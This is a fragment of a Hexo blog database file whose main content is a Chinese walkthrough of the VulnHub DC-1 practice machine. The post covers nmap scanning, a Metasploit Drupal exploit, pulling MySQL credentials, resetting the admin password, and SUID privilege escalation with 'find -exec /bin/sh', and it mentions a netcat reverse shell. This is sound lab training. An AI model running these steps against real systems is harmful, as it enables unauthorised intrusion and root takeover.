ed":1624161765199},{"_id":"public/js/clicklove.js","hash":"9e8e79d69ad8338761272f86fe5cad0ad5e503cc","modified":1624161765199},{"_id":"public/js/goTop.js","hash":"3b28b9333e474939e65271ac8a70b695143e803c","modified":1624161765199},{"_id":"public/js/local_search.js","hash":"37c1f96f7d8e02b147d2c07468af7e5442a94a4f","modified":1624161765199},{"_id":"public/js/ribbon.min.js","hash":"3c8e4d717ca107f3723def1795c8ed62a5f1a8d0","modified":1624161765199},{"_id":"public/js/snow.js","hash":"264295c67eaae8057380af993fc9f578c340afbd","modified":1624161765199},{"_id":"public/js/swiper.animate1.0.3.min.js","hash":"0e48f180ca2f18b787e4b7b6e55ee3b0c6067691","modified":1624161765199},{"_id":"public/js/wrapImage.js","hash":"ad2a3a09efb390265b99bbe2896cd899e57b1aef","modified":1624161765199},{"_id":"public/js/aos/aos.js","hash":"850ee2e5c9fba610840137c6c4e92b5abbc428fe","modified":1624161765199},{"_id":"public/js/aplayer/APlayer@1.10.1.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1624161765199},{"_id":"public/js/bubble/bubble.js","hash":"20abc5ae3bde679d933283d41a7762954f0b28d3","modified":1624161765199},{"_id":"public/js/bubble/homeBubble.js","hash":"a8635136621c8c54c04462932192a94f314942cb","modified":1624161765199},{"_id":"public/js/clipboard/clipboard.min.js","hash":"6371ec0a8e242395c7d4d008d2b98e472c9dcc52","modified":1624161765199},{"_id":"public/js/cursor/clicklove.js","hash":"9e8e79d69ad8338761272f86fe5cad0ad5e503cc","modified":1624161765199},{"_id":"public/js/cursor/explosion.min.js","hash":"ed2d0a5ad306a2745b7c8180b69e36b78d4b0698","modified":1624161765199},{"_id":"public/js/cursor/fireworks.js","hash":"6e1e9206549a6a1a4f5a8672a2dc5044a8f691bd","modified":1624161765199},{"_id":"public/js/cursor/text.js","hash":"a015017310e601f1e544cbc4b08c35b8e547c939","modified":1624161765199},{"_id":"public/js/danmu/barrager.css","hash":"3691efec6dd3d554b4a3dd20ef04836459f151a8","modified":1624161765199},{"_id":"public/js/danmu/jquery.barrager.js","hash":"305d6e93f3de102b5e1e9b1373821c849d8f54cb","modified":1624161765199},{"_id":"public/js/fancybox/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1624161765199},{"_id":"public/js/header/index.js","hash":"792809031929e2ae4f1da05dabc604870b1b6ab7","modified":1624161765199},{"_id":"public/js/issues/index.js","hash":"2d1964fcdb8332a1c7d1a528050f75b11e4b5b78","modified":1624161765199},{"_id":"public/js/lazyload/lazyload@1.9.1.js","hash":"690e0f376661f4c8fc69177927768263968ecf89","modified":1624161765199},{"_id":"public/js/loaded/index.css","hash":"6ffc29024687d49fda0d474dd4a94fc706b8d7fc","modified":1624161765199},{"_id":"public/js/prism/prism-coy.min.css","hash":"fe1246de39c25eaa7ad1b0c997ee530dbdd39ad8","modified":1624161765199},{"_id":"public/js/prism/prism-dark.min.css","hash":"a3f604a19e9a46f83a2fde49dfb45782748957ca","modified":1624161765199},{"_id":"public/js/prism/prism-funky.min.css","hash":"0220f68ccda78c2b5d1109e58f3879674c93b587","modified":1624161765199},{"_id":"public/js/prism/prism-line-numbers.css","hash":"3b64b50b73729de943ec894c1d6f19115fa81624","modified":1624161765199},{"_id":"public/js/prism/prism-okaidia.min.css","hash":"50be6cc15d883ff3fa5d0885fed47241695a986c","modified":1624161765199},{"_id":"public/js/prism/prism-solarizedlight.min.css","hash":"927b757cd8030d12953b5c0fa6eed5de15dda8ad","modified":1624161765199},{"_id":"public/js/prism/prism-tomorrow.min.css","hash":"7b4247bc4d3b719afe5957779d0e5c8fb716c8ea","modified":1624161765199},{"_id":"public/js/prism/prism-twilight.min.css","hash":"ff4a6e3c4f1cb9bb59ec061656eacb750d238c15","modified":1624161765199},{"_id":"public/js/prism/prism.min.css","hash":"aa405e2bcb571595c822a80f5482454c1536fa52","modified":1624161765199},{"_id":"public/js/shareJs/font.css","hash":"9d909397e4e94f696b7dd90a16481b50cf170362","modified":1624161765199},{"_id":"public/js/shareJs/share.min.css","hash":"573c7dddb465efd5f5a9337bd50a1ed3f8e82cff","modified":1624161765199},{"_id":"public/js/tocbot/tocbot.css","hash":"15601837bf8557c2fd111e4450ed4c8495fd11a0","modified":1624161765199},{"_id":"public/js/tocbot/tocbot.min.js","hash":"98af336bfc6118bd6aaae5722491e212ab70b5d3","modified":1624161765199},{"_id":"public/css/style.css","hash":"ae42b1ed8566d510a2117125c07d58cd51f62cea","modified":1624161765199},{"_id":"public/medias/13.jpg","hash":"7ea13927656212e845a6b272b1f2b68541f358b0","modified":1624161765199},{"_id":"public/medias/3.jpg","hash":"46abc4f2b31a4cfd0274561b08c3d30901748ca6","modified":1624161765199},{"_id":"public/medias/about.jpg","hash":"24c7657d2a6830d5238daf2b917f71a9545e95ef","modified":1624161765199},{"_id":"public/medias/tagDetail.jpg","hash":"f6b3a4f16ac95ebdcfcc6ac107419c22ad12706f","modified":1624161765199},{"_id":"public/js/vue-seamless-scroll/index.js","hash":"f2aaf3f9b1ab7362f7cc158e5360cb1d62a57172","modified":1624161765199},{"_id":"public/js/vue-typed-js/index.css","hash":"36a1d2f61d11ab328e349d6a523dd9dea2ec7ee1","modified":1624161765199},{"_id":"public/js/vue-awesome-swiper.js","hash":"b7a1ab21dfc58272009bfb5cb7ab87b79f5df573","modified":1624161765199},{"_id":"public/js/aos/aos.css","hash":"0557d37454b67f42f2cb101e57e5070fb1193570","modified":1624161765199},{"_id":"public/js/shareJs/social-share.min.js","hash":"efdfa6b695ac6f0dd04cd8153d3e3a1a1edd90c2","modified":1624161765199},{"_id":"public/js/vue-typed-js/index.js","hash":"0d80f25135de943ccdfdebec23275bd82712fae1","modified":1624161765199},{"_id":"public/medias/12.jpg","hash":"ded3ab7067e46ee0dee4d445cef7ebc5a68911d8","modified":1624161765199},{"_id":"public/medias/23.jpg","hash":"7b825b166abb3e3369e0439b07c59df1732fd237","modified":1624161765199},{"_id":"public/medias/tag.jpg","hash":"1d9ca36570c4c9545c06eac243c9513214a56d72","modified":1624161765199},{"_id":"public/medias/22.jpg","hash":"772e9f30a50261772e7d7efff444464e77486576","modified":1624161765199},{"_id":"public/medias/25.jpg","hash":"f9a4719224c74eea40a4adcfb388d9e8f48ff99e","modified":1624161765199},{"_id":"public/medias/26.jpg","hash":"f426a38c51898f0d3be47c9334792af8ca593ffc","modified":1624161765199},{"_id":"public/medias/5.jpg","hash":"2ed9aa82a5517c081cb8a75d907110bfeeecd2da","modified":1624161765199},{"_id":"public/medias/7.jpg","hash":"044e26820057db8af3adc75cca5980f4a47b0b09","modified":1624161765199},{"_id":"public/medias/8.jpg","hash":"85f1a539d9e2b521e6674c089e5cf08a998dc3a8","modified":1624161765199},{"_id":"public/css/animate.min.css","hash":"8411c1c0418521c96d07bcca0d9dbce7e832ccc9","modified":1624161765199},{"_id":"public/js/sakura.js","hash":"9e196ab241799126e6a2dd23ee1708b1505ccbf0","modified":1624161765199},{"_id":"public/medias/4.jpg","hash":"948818e0c01cee8893ebcc2ea2b85a70a9f123e4","modified":1624161765199},{"_id":"public/js/fancybox/jquery.fancybox.min.js","hash":"6181412e73966696d08e1e5b1243a572d0f22ba6","modified":1624161765199},{"_id":"public/medias/6.jpg","hash":"ff2a33260bcf920a96b93c8aebfbba826fb168cf","modified":1624161765199},{"_id":"public/js/jquery3.5.1.js","hash":"d2cc8d43ce1c854b1172e42b1209502ad563db83","modified":1624161765199},{"_id":"public/medias/11.jpg","hash":"6f89f09bfd8eb868550f6091e34e58955ecaae31","modified":1624161765199},{"_id":"public/medias/15.jpg","hash":"d8365c47e541dcd9c384d40afeac8bdef01f720f","modified":1624161765199},{"_id":"public/medias/16.jpg","hash":"3a8e914581aba12ce377526e7bd3bbcf906ae640","modified":1624161765199},{"_id":"public/medias/17.jpg","hash":"3320063cc35a2f65b96db4b7521ccce72c7fe20b","modified":1624161765199},{"_id":"public/medias/24.jpg","hash":"e4e2afc34554d24e32d177e0eff87c23a4cee38e","modified":1624161765199},{"_id":"public/medias/10.jpg","hash":"3efdbf03f4409f8ee04742b14609c1f1f1701fde","modified":1624161765199},{"_id":"public/medias/2.jpg","hash":"ee92d2c7a32bfdb85caf5475215d593ef5688c17","modified":1624161765199},{"_id":"public/medias/21.jpg","hash":"448416cdd699c935b72c1afcfea5725151ba48cb","modified":1624161765199},{"_id":"public/medias/1.jpg","hash":"ee68d13be9811aeb7adac6ec2788a939a9975041","modified":1624161765199},{"_id":"public/medias/20.jpg","hash":"fbb20bab7b6cdf6a55a19b013ac269443fdc717d","modified":1624161765199},{"_id":"public/js/swiper.min.js","hash":"a2fe3c0df9196597c283b2f6ffecc1d4d8702245","modified":1624161765199},{"_id":"public/js/valine/av-min@3.0.4.js","hash":"6d7100ab357ac92291901dbbf0d4c683d05a7672","modified":1624161765199},{"_id":"public/medias/19.jpg","hash":"cd88dcd90f5a5b3aee677c57ca7670b4993b700e","modified":1624161765199},{"_id":"public/js/my404/bodymovin.js","hash":"0101a4545f219753bb617e9f1794444694b3e7d0","modified":1624161765199},{"_id":"public/js/my404/data.js","hash":"a9ba4005f96055774d3ff6977bd420d46da42da7","modified":1624161765199},{"_id":"public/medias/14.jpg","hash":"f4f8a54445f3ff755124c576e3ccb7dc0672d813","modified":1624161765199},{"_id":"public/js/vue2.6.11.js","hash":"e793aa33ef33150eaba3bc02b07455a231f053ad","modified":1624161765199},{"_id":"public/medias/9.jpg","hash":"58fa1513d2e1bbf2ac2dbb7a8aabf9a0f03e28aa","modified":1624161765199},{"_id":"public/js/twikoo/twikoo.all.min.js","hash":"c3f5f0a69b7864e7ef5bbf99fc774bec37947d7c","modified":1624161765199}],"Category":[{"name":"渗透测试","_id":"ckq4nzaxg00047vvtcm64a53g"},{"name":"git","_id":"ckq4nzaxn000b7vvt5kkp5w86"},{"name":"linux","_id":"ckq4nzaxu000g7vvt4r22a2tv"},{"name":"blog","_id":"ckq4nzaxy000n7vvt1sivf7ms"},{"name":"kali","_id":"ckq4nzay0000s7vvt4zsnhpgr"},{"name":"tool","_id":"ckq4nzay900107vvt31l1f999"},{"name":"python","_id":"ckq4nzayc00187vvt8bzmefho"},{"name":"win10","_id":"ckq4nzaye001c7vvt1podfl5t"},{"name":"网络","_id":"ckq4nzayg001j7vvt68tpewov"},{"name":"shell","_id":"ckq4nzayh001p7vvt833z2oqi"},{"name":"数据库","_id":"ckq4nzayj001s7vvtaujh4xke"}],"Data":[],"Page":[{"title":"about","date":"2020-09-14T07:30:30.000Z","type":"about","layout":"about","_content":"\n# 联系方式\nQQ: 2296557984\nGithub: github.com/mxrmiss\n邮箱：heroli520@outlook.com\n\n\n## 博客声明\n\n- 本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容\n- 转载时应注明出处\n- 本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任\n- 感谢本博客主题提供者\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2020-09-14 15:30:30 # 时间随便写\ntype: \"about\"\nlayout: \"about\"\n---\n\n# 联系方式\nQQ: 2296557984\nGithub: github.com/mxrmiss\n邮箱：heroli520@outlook.com\n\n\n## 博客声明\n\n- 本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容\n- 转载时应注明出处\n- 本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任\n- 感谢本博客主题提供者\n","updated":"2021-06-19T17:21:11.941Z","path":"about/index.html","comments":1,"_id":"ckq4nzax200007vvtcaa1gvyr","content":"<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><p>QQ: 2296557984<br>Github: github.com/mxrmiss<br>邮箱：<a href=\"mailto:&#104;&#101;&#x72;&#111;&#108;&#105;&#53;&#50;&#48;&#x40;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;\">&#104;&#101;&#x72;&#111;&#108;&#105;&#53;&#50;&#48;&#x40;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;</a></p>\n<h2 id=\"博客声明\"><a href=\"#博客声明\" class=\"headerlink\" title=\"博客声明\"></a>博客声明</h2><ul>\n<li>本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容</li>\n<li>转载时应注明出处</li>\n<li>本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任</li>\n<li>感谢本博客主题提供者</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><p>QQ: 2296557984<br>Github: github.com/mxrmiss<br>邮箱：<a href=\"mailto:&#104;&#101;&#x72;&#111;&#108;&#105;&#53;&#50;&#48;&#x40;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;\">&#104;&#101;&#x72;&#111;&#108;&#105;&#53;&#50;&#48;&#x40;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;</a></p>\n<h2 id=\"博客声明\"><a href=\"#博客声明\" class=\"headerlink\" title=\"博客声明\"></a>博客声明</h2><ul>\n<li>本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容</li>\n<li>转载时应注明出处</li>\n<li>本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任</li>\n<li>感谢本博客主题提供者</li>\n</ul>\n"},{"title":"archives","date":"2021-06-19T17:31:51.000Z","type":"archives","layout":"archives","_content":"","source":"archives/index.md","raw":"---\ntitle: archives\ndate: 2021-06-20 01:31:51\ntype: \"archives\"\nlayout: \"archives\"\n---\n","updated":"2021-06-19T17:33:52.126Z","path":"archives/index.html","comments":1,"_id":"ckq4nzax700027vvt0jh3aood","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2020-09-14T07:30:30.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2020-09-14 15:30:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n","updated":"2021-06-20T03:17:38.305Z","path":"categories/index.html","comments":1,"_id":"ckq4nzaxi00067vvt23rp8wd3","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2020-09-14T07:30:30.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2020-09-14 15:30:30\ntype: \"tags\"\nlayout: \"tags\"\n---\n","updated":"2021-06-19T16:23:07.723Z","path":"tags/index.html","comments":1,"_id":"ckq4nzaxk00087vvt46e8h8xb","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"DC_1靶机渗透测试","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_3.jpg","top":false,"_content":"\n# DC_1靶机渗透测试\n\n- [参考链接1]([萌新教程丨VulnHubDC系列之DC1靶机渗透测试 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/135342104))\n- [参考链接2]([Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)](https://www.jianshu.com/p/86b3c598a4c4))\n- [参考链接3]([(4条消息) Vulnhub-DC1靶机渗透_adminuil的博客-CSDN博客](https://blog.csdn.net/adminuil/article/details/101269264))\n- [参考链接4]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\n\n## 一、DC_1的准备\n\n1.  在官网上下载DC_1镜像文件到电脑1上并且解压到虚拟机上，我使用的是VMware\n2. 将DC_1与攻击机器配置在同一网段上\n\n[![R9rCFS.png](https://z3.ax1x.com/2021/06/18/R9rCFS.png)](https://imgtu.com/i/R9rCFS)\n\n- 以管理员权限**更改设置**\n\n![DC_1_2](http://cdn.mxrblog.cn/DC_1_2.jpg)\n\n- 查看物理电脑正在使用的网卡，将虚拟机网卡设置为一致\n\n![DC1_3](http://cdn.mxrblog.cn/DC1_3.png)\n\n\n\n## 二、信息收集\n\n### 1. nmap\n\n- 先使用nmap侦测DC1的IP地址\n\n```\nnmap -sP 192.168.0.0/24       //查询这个网段里面的活的IP\n```\n\n![image-20210619095954498](http://cdn.mxrblog.cn/image-20210619095954498.png)\n\n### 2. arp-scan -l\n\n- 再使用sudo arp-scan -l 探测，可知DC_1的IP是192.168.0.155\n\n![image-20210619100321088](http://cdn.mxrblog.cn/image-20210619100321088.png)\n\n### 3. 查看DC_1的开放端口\n\n- 使用nmap -sV -A 192.168.0.155 可以发现DC_1开放了80端口\n\n![image-20210619100832836](http://cdn.mxrblog.cn/image-20210619100832836.png)\n\n### 4. 登陆192.168.0.155:80\n\n- 发现网站下面有powered by Drupal，可以推断出网站的CMS是Drupal\n\n![image-20210619101204599](http://cdn.mxrblog.cn/image-20210619101204599.png)\n\n## 二、寻找漏洞\n\n- 由于我们已经知晓网站的CMS是Drupal，于是我们可以使用msf探测Drupal的漏洞，并加以利用\n\n![image-20210619101755241](http://cdn.mxrblog.cn/image-20210619101755241.png)\n\n- 使用漏洞4，并发现必须注明RHOSTS\n\n![image-20210619102053400](http://cdn.mxrblog.cn/image-20210619102053400.png)\n\n- 注明Rhosts， 并且运行（exploit和run运行皆可）\n\n![image-20210619102607700](http://cdn.mxrblog.cn/image-20210619102607700.png)\n\n\n\n## 三、寻找flag\n\n- 执行ls， 并且发现flag1\n\n![image-20210619102900990](http://cdn.mxrblog.cn/image-20210619102900990.png)\n\n- 查看flag1的信息， 发现1在提示我们查看CMS的配置文件\n\n![image-20210619103026632](http://cdn.mxrblog.cn/image-20210619103026632.png)\n\n- 通过网上搜素，发现Drupal的配置文件在 /var/www/sites/default 下，切换至该目录下，发现配置文件settings.php，查看内容发现flag2，并且提示不能使用字典暴力破解，通过观察配置文件，我们找到了MySQL的登录名以及密码\n\n![image-20210619103714950](http://cdn.mxrblog.cn/image-20210619103714950.png)\n\n- 登录mysql，发现无法只用mysql命令\n\n![image-20210619104328728](http://cdn.mxrblog.cn/image-20210619104328728.png)\n\n- 由于mfs终端下的局限性，可使用的命令较少，获取DC_1的shell并设置一个交互式shell用来回显MySQL指令\n\n```\nshell     //进入shell\npython -c \"import pty;pty.spawn('/bin/bash')\"   //设置交互式shell\n```\n\n![image-20210619104807264](http://cdn.mxrblog.cn/image-20210619104807264.png)\n\n- 再次登录MySQL\n\n![image-20210619105030783](http://cdn.mxrblog.cn/image-20210619105030783.png)\n\n- 寻找储存有用信息的表\n\n![image-20210619105436601](http://cdn.mxrblog.cn/image-20210619105436601.png)\n\n- 发现表users\n\n![image-20210619105516728](http://cdn.mxrblog.cn/image-20210619105516728.png)\n\n- 查看表users的内容， 发现管理员以及经过加密后的密码，通过网上搜索，得知该CMS的加密方式文件在 /var/www/scripts/password-hash.sh\n\n![image-20210619105726822](http://cdn.mxrblog.cn/image-20210619105726822.png)\n\n- 经过Google得知，使用  ./scripts/password-hash.sh   %^@#&  可以加密，获取加密后的密码\n\n![image-20210619110656291](http://cdn.mxrblog.cn/image-20210619110656291.png)\n\n- 再次进入数据库并且更改管理员的密码\n\n![image-20210619111111061](http://cdn.mxrblog.cn/image-20210619111111061.png)\n\n- 利用更改后的账号密码登录网站，寻找后发现flag3，flag3的信息中提到了passwd和shadow,很明显就是`/etc/passwd和/etc/shadow`，还提到了`find、perms、-exec`，这几个是提权用的。\n\n![image-20210619111628491](http://cdn.mxrblog.cn/image-20210619111628491.png)\n\n- 查看 /etc/passwd，可以找到flag4的位置\n\n![image-20210619113107387](http://cdn.mxrblog.cn/image-20210619113107387.png)\n\n- 查看flag4的内容，发现在root下有flag，需要提权\n\n![image-20210619113333252](http://cdn.mxrblog.cn/image-20210619113333252.png)\n\n- 通过find命令查看有哪些使用root权限执行的文件\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n![image-20210619114815699](http://cdn.mxrblog.cn/image-20210619114815699.png)\n\n- 发现find可以利用，并且获取root权限\n\n![image-20210619115449178](http://cdn.mxrblog.cn/image-20210619115449178.png)\n\n- 进入root目录，发现并打开最后一个flag\n\n![image-20210619115723615](http://cdn.mxrblog.cn/image-20210619115723615.png)\n\n+ **另外还可以使用find + netcat的方式获取root权限**\n\n- *对于靶机shell，发送自己的shell*\n\n![image-20210619120620378](http://cdn.mxrblog.cn/image-20210619120620378.png)\n\n- *对于攻击机器，监听靶机上建立特意开放的端口号*\n\n![image-20210619120759548](http://cdn.mxrblog.cn/image-20210619120759548.png)\n\n\n\n## 知识点\n\n### [Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\n\n　**SUID** (**S**et owner **U**ser **ID** up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件**。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。**\n\n- 查找suid文件\n\n```\nfind / -perm -u=s -type f 2> /dev/null\n/表示从文件系统的顶部（根）开始并找到每个目录\n-perm 表示搜索随后的权限``-u = s表示查找root用户拥有的文件\ntype表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2表示该进程的第二个文件描述符，即stderr（标准错误）\n>表示重定向\n/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。\n```\n\n- find提权\n\n```\nfind -exec /bin/sh \\;\n```\n\n","source":"_posts/DC_1.md","raw":"---\ntitle: DC_1靶机渗透测试 \ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: 渗透测试\ntags: [渗透测试, DC]   # 可以是数组\ntop: false\n---\n\n# DC_1靶机渗透测试\n\n- [参考链接1]([萌新教程丨VulnHubDC系列之DC1靶机渗透测试 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/135342104))\n- [参考链接2]([Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)](https://www.jianshu.com/p/86b3c598a4c4))\n- [参考链接3]([(4条消息) Vulnhub-DC1靶机渗透_adminuil的博客-CSDN博客](https://blog.csdn.net/adminuil/article/details/101269264))\n- [参考链接4]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\n\n## 一、DC_1的准备\n\n1.  在官网上下载DC_1镜像文件到电脑1上并且解压到虚拟机上，我使用的是VMware\n2. 将DC_1与攻击机器配置在同一网段上\n\n[![R9rCFS.png](https://z3.ax1x.com/2021/06/18/R9rCFS.png)](https://imgtu.com/i/R9rCFS)\n\n- 以管理员权限**更改设置**\n\n![DC_1_2](http://cdn.mxrblog.cn/DC_1_2.jpg)\n\n- 查看物理电脑正在使用的网卡，将虚拟机网卡设置为一致\n\n![DC1_3](http://cdn.mxrblog.cn/DC1_3.png)\n\n\n\n## 二、信息收集\n\n### 1. nmap\n\n- 先使用nmap侦测DC1的IP地址\n\n```\nnmap -sP 192.168.0.0/24       //查询这个网段里面的活的IP\n```\n\n![image-20210619095954498](http://cdn.mxrblog.cn/image-20210619095954498.png)\n\n### 2. arp-scan -l\n\n- 再使用sudo arp-scan -l 探测，可知DC_1的IP是192.168.0.155\n\n![image-20210619100321088](http://cdn.mxrblog.cn/image-20210619100321088.png)\n\n### 3. 查看DC_1的开放端口\n\n- 使用nmap -sV -A 192.168.0.155 可以发现DC_1开放了80端口\n\n![image-20210619100832836](http://cdn.mxrblog.cn/image-20210619100832836.png)\n\n### 4. 登陆192.168.0.155:80\n\n- 发现网站下面有powered by Drupal，可以推断出网站的CMS是Drupal\n\n![image-20210619101204599](http://cdn.mxrblog.cn/image-20210619101204599.png)\n\n## 二、寻找漏洞\n\n- 由于我们已经知晓网站的CMS是Drupal，于是我们可以使用msf探测Drupal的漏洞，并加以利用\n\n![image-20210619101755241](http://cdn.mxrblog.cn/image-20210619101755241.png)\n\n- 使用漏洞4，并发现必须注明RHOSTS\n\n![image-20210619102053400](http://cdn.mxrblog.cn/image-20210619102053400.png)\n\n- 注明Rhosts， 并且运行（exploit和run运行皆可）\n\n![image-20210619102607700](http://cdn.mxrblog.cn/image-20210619102607700.png)\n\n\n\n## 三、寻找flag\n\n- 执行ls， 并且发现flag1\n\n![image-20210619102900990](http://cdn.mxrblog.cn/image-20210619102900990.png)\n\n- 查看flag1的信息， 发现1在提示我们查看CMS的配置文件\n\n![image-20210619103026632](http://cdn.mxrblog.cn/image-20210619103026632.png)\n\n- 通过网上搜素，发现Drupal的配置文件在 /var/www/sites/default 下，切换至该目录下，发现配置文件settings.php，查看内容发现flag2，并且提示不能使用字典暴力破解，通过观察配置文件，我们找到了MySQL的登录名以及密码\n\n![image-20210619103714950](http://cdn.mxrblog.cn/image-20210619103714950.png)\n\n- 登录mysql，发现无法只用mysql命令\n\n![image-20210619104328728](http://cdn.mxrblog.cn/image-20210619104328728.png)\n\n- 由于mfs终端下的局限性，可使用的命令较少，获取DC_1的shell并设置一个交互式shell用来回显MySQL指令\n\n```\nshell     //进入shell\npython -c \"import pty;pty.spawn('/bin/bash')\"   //设置交互式shell\n```\n\n![image-20210619104807264](http://cdn.mxrblog.cn/image-20210619104807264.png)\n\n- 再次登录MySQL\n\n![image-20210619105030783](http://cdn.mxrblog.cn/image-20210619105030783.png)\n\n- 寻找储存有用信息的表\n\n![image-20210619105436601](http://cdn.mxrblog.cn/image-20210619105436601.png)\n\n- 发现表users\n\n![image-20210619105516728](http://cdn.mxrblog.cn/image-20210619105516728.png)\n\n- 查看表users的内容， 发现管理员以及经过加密后的密码，通过网上搜索，得知该CMS的加密方式文件在 /var/www/scripts/password-hash.sh\n\n![image-20210619105726822](http://cdn.mxrblog.cn/image-20210619105726822.png)\n\n- 经过Google得知，使用  ./scripts/password-hash.sh   %^@#&  可以加密，获取加密后的密码\n\n![image-20210619110656291](http://cdn.mxrblog.cn/image-20210619110656291.png)\n\n- 再次进入数据库并且更改管理员的密码\n\n![image-20210619111111061](http://cdn.mxrblog.cn/image-20210619111111061.png)\n\n- 利用更改后的账号密码登录网站，寻找后发现flag3，flag3的信息中提到了passwd和shadow,很明显就是`/etc/passwd和/etc/shadow`，还提到了`find、perms、-exec`，这几个是提权用的。\n\n![image-20210619111628491](http://cdn.mxrblog.cn/image-20210619111628491.png)\n\n- 查看 /etc/passwd，可以找到flag4的位置\n\n![image-20210619113107387](http://cdn.mxrblog.cn/image-20210619113107387.png)\n\n- 查看flag4的内容，发现在root下有flag，需要提权\n\n![image-20210619113333252](http://cdn.mxrblog.cn/image-20210619113333252.png)\n\n- 通过find命令查看有哪些使用root权限执行的文件\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n![image-20210619114815699](http://cdn.mxrblog.cn/image-20210619114815699.png)\n\n- 发现find可以利用，并且获取root权限\n\n![image-20210619115449178](http://cdn.mxrblog.cn/image-20210619115449178.png)\n\n- 进入root目录，发现并打开最后一个flag\n\n![image-20210619115723615](http://cdn.mxrblog.cn/image-20210619115723615.png)\n\n+ **另外还可以使用find + netcat的方式获取root权限**\n\n- *对于靶机shell，发送自己的shell*\n\n![image-20210619120620378](http://cdn.mxrblog.cn/image-20210619120620378.png)\n\n- *对于攻击机器，监听靶机上建立特意开放的端口号*\n\n![image-20210619120759548](http://cdn.mxrblog.cn/image-20210619120759548.png)\n\n\n\n## 知识点\n\n### [Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\n\n　**SUID** (**S**et owner **U**ser **ID** up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件**。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。**\n\n- 查找suid文件\n\n```\nfind / -perm -u=s -type f 2> /dev/null\n/表示从文件系统的顶部（根）开始并找到每个目录\n-perm 